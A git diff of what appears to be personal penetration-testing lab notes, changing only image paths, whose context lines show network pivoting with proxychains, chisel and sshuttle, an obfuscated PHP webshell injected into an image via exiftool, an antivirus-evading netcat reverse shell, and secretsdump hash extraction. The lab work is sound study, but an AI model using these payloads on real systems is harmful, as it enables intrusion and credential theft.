@@ -28,7 +28,7 @@ for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done
 Proxychains when working w CLI tools\
 Activated by prepending the command `proxychains` to other commands. Reads options from `etc/proxychains.conf` however it looks for that file in pwd first so to make sure you dont mess up the master config file just cp to pwd and modify that one
 
-<div align="left"><figure><img src=".gitbook/assets/image (69).png" alt="" width="156"><figcaption><p>Only TCP scans allowed, no ICMP also so <code>-Pn</code></p></figcaption></figure></div>
+<div align="left"><figure><img src="../.gitbook/assets/image (69).png" alt="" width="156"><figcaption><p>Only TCP scans allowed, no ICMP also so <code>-Pn</code></p></figcaption></figure></div>
 
 Foxyproxy for accessing webapp, you've already used it to configure burp, go for SOCKS5 cus chisel uses it SOCKS4 is default proxy type
 
@@ -100,7 +100,7 @@ Change proxychains config file to SOCKS5 instead of 4 if using this
 
 LISTEN\_PORT is the port chisel started the server in and LOCAL\_PORT is the port we wish to use to leverage access
 
-<div align="left"><figure><img src=".gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure></div>
+<div align="left"><figure><img src="../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure></div>
 
 #### Sshuttle
 
@@ -117,7 +117,7 @@ sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5      #use -x to exclude 
 
 ### Git Server
 
-<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now we can access 10.200.84.150 from our own machine w no extra setup crazy, if this wasn't there we would have to setup a proxy using proxychains or sum else
 
@@ -197,7 +197,7 @@ Again we open up a port on the git server for pivot connection
 `./chisel.exe server -p 15555 --socks5`\
 `chisel client 10.200.84.150:15555 13388:socks`
 
-<figure><img src=".gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>
 
 Why we doing all this again?
 
@@ -209,7 +209,7 @@ From portscan we find out ports 80 and 3389 are open, no password so RDP useless
 
 Configuring our foxyproxy to access the webpage
 
-<figure><img src=".gitbook/assets/image (75).png" alt=""><figcaption><p>notice SOCKS5 and port number used</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (75).png" alt=""><figcaption><p>notice SOCKS5 and port number used</p></figcaption></figure>
 
 and voila we can access 10.200.84.100 and it turns out to be the same webpage from .150, it was a gitserver after all so version control uses.
 
@@ -278,7 +278,7 @@ The second one is a bit more refined and offers clean output, now putting this i
 exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" dune2.jpg.php
 ```
 
-<figure><img src=".gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>
 
 Now to get a reverse shell, Defender will easily identify a powershell exploit and PHP reverse shells may be unstable, the easiest option is to upload netcat. Here also we need a version different to the norm so Defender can't catch it
 
@@ -351,7 +351,7 @@ Catch the reverse shell, we are root
 
 `python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL`
 
-<figure><img src=".gitbook/assets/image (77).png" alt=""><figcaption><p>dump user hashes using sam and system files</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (77).png" alt=""><figcaption><p>dump user hashes using sam and system files</p></figcaption></figure>
 
 ### Conclusion
 
